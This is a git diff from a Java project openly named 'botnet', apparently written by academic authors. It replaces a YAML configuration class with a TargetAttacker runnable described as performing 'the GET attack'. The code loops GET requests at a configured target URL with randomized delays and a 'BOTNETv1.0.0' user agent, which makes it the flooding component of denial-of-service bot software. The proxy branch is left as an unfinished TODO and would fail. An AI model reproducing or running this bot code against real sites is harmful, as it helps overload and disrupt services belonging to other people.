@@ -24,51 +24,63 @@
  * THE SOFTWARE.
  */
 
-package com.giammp.botnet.config;
+package com.giammp.botnet.control;
 
 import com.giammp.botnet.model.Target;
-import com.giammp.botnet.model.SleepCondition;
-import org.yaml.snakeyaml.TypeDescription;
-import org.yaml.snakeyaml.constructor.Constructor;
+import com.giammp.botnet.utils.RandomUtils;
+import lombok.Data;
+
+import java.io.IOException;
+import java.net.*;
+import java.util.Random;
 
 /**
- * This class realizes the constructor for the SnakeYaml Parser, intended to the parsing of the
- * YAML configuration file.
- *
- * This class is implemented as a singleton.
+ * This class realizes the runnable that performs the GET attack.
  *
  * @author Giacomo Marciani <gmarciani@ieee.org>
  * @author Michele Porretta <mporretta@acm.org>
  * @since 1.0.0
- * @see BotConfigurator
- * @see BotConfiguration
- * @see org.yaml.snakeyaml.Yaml
- * @see Constructor
- * @see TypeDescription
+ * @see Target
  */
-public class YamlConstructor extends Constructor {
+@Data
+public class TargetAttacker implements Runnable {
+  private final Target target;
+  private Random rnd = new Random();
 
-  private static YamlConstructor instance;
-
-  /**
-   * Initializes the singleton instance of the class.
-   * @return the singleton instance of the class.
-   */
-  public static YamlConstructor getInstance() {
-    if (instance == null) {
-      instance = new YamlConstructor();
+  @Override
+  public void run() {
+    Target tgt = this.getTarget();
+    int i = 0;
+    for (i = 0; i < tgt.getMaxAttempts(); i++) {
+      try {
+        this.makeGetRequest(tgt.getUrl(), tgt.getProxy());
+      } catch (IOException e) {
+        e.printStackTrace();
+        return;
+      }
+      int millis = RandomUtils.getRandomInt(tgt.getTimeMin(), tgt.getTimeMax(), this.getRnd());
+      try {
+        Thread.sleep(millis);
+      } catch (InterruptedException e) {
+        e.printStackTrace();
+      }
     }
-    return instance;
   }
 
-  /**
-   * Constructor for the singleton of the class.
-   */
-  private YamlConstructor() {
-    super(BotConfiguration.class);
-    TypeDescription description = new TypeDescription(BotConfiguration.class);
-    description.putListPropertyType("targets", Target.class);
-    description.putListPropertyType("sleep", SleepCondition.class);
-    super.addTypeDescription(description);
+  private void makeGetRequest(final String address, final String proxy) throws IOException {
+    URL url = new URL(address);
+    HttpURLConnection http = null;
+
+    if (proxy == null) {
+      http = (HttpURLConnection) url.openConnection();
+    } else {
+      // TODO
+    }
+
+    http.setRequestMethod("GET");
+    http.setRequestProperty("User-Agent", "BOTNETv1.0.0");
+    int response = http.getResponseCode();
+    System.out.format("[BOT]> GET %s :: %d\n", url, response);
   }
+
 }
